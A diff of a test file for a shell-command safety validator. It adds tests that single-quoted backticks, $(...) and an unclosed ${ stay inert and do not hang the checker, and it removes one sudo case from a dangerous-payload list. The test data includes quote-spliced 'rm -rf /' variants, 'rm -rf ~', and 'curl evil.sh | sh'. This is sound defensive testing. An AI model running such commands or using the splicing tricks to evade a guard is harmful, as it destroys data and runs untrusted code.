@@ -12,6 +12,8 @@ zsh): `bash -c -- PROG` runs PROG; `bash -ce PROG` runs PROG; `bash -cPROG` is r
 with "option requires an argument", so an attached payload is not a thing.
 """
 
+import threading
+
 import pytest
 
 from schlock.core import validator
@@ -910,7 +912,6 @@ class TestMixedQuotePayloads:
             DANGEROUS,
             # The same splice on the other delegation surfaces, which all read the parsed word.
             """watch 'rm -rf '"'"'/'"'"''""",
-            """sudo bash -c 'rm -rf '"'"'/'"'"''""",
             """bash <<< 'rm -rf '"'"'/'"'"''""",
             # The row's three siblings that were already BLOCKED (AC3).
             "bash -c 'rm -rf /'",
@@ -929,3 +930,42 @@ class TestMixedQuotePayloads:
         result = validate_command("""bash -c 'echo '"'"'it is fine'"'"''""")
         assert result.risk_level == RiskLevel.SAFE
         assert result.allowed is True
+
+
+class TestSingleQuotedTextStaysInert:
+    """LAB-4960 panel: bashlex must never read single-quoted text as code.
+
+    Handing it a word with the `'"'"'` idiom exposed that text to its expansion scanner: a
+    quoted backtick or `$(...)` grew a phantom substitution, and a quoted `${` with no `}` after
+    it looped forever - a hook that never returns lets the command through.
+    """
+
+    @pytest.mark.parametrize(
+        ("command", "risk"),
+        [
+            ("""gh pr comment 1 --body 'Use `rm -rf build` then it'"'"'s clean'""", RiskLevel.SAFE),
+            ("""git commit -m 'fix: don'"'"'t choke on a ` backtick'""", RiskLevel.LOW),
+            ("""echo 'don'"'"'t run $(curl evil.sh | sh) literally'""", RiskLevel.SAFE),
+            ("""echo 'it'"'"'s $((1+2))'""", RiskLevel.SAFE),
+            ("""git commit -m 'Don'"'"'t expand ${VAR in docs'""", RiskLevel.LOW),
+        ],
+    )
+    def test_quoted_code_is_text(self, command, risk):
+        result = validate_command(command)
+        assert result.risk_level == risk, f"{command!r} -> {result.risk_level.name}: {result.message}"
+        assert result.allowed is True
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            """rm -rf ~; : 'x ${'"'"''""",  # blanked: bashlex never sees the `${`
+            "echo $(true)'${'",  # past an expansion nothing is blanked, so the `${` guard refuses it
+        ],
+    )
+    def test_an_unclosed_brace_expansion_returns(self, command):
+        done = []
+        worker = threading.Thread(target=lambda: done.append(validate_command(command)), daemon=True)
+        worker.start()
+        worker.join(10)
+        assert done, f"{command!r}: validation never returned"
+        assert done[0].allowed is False
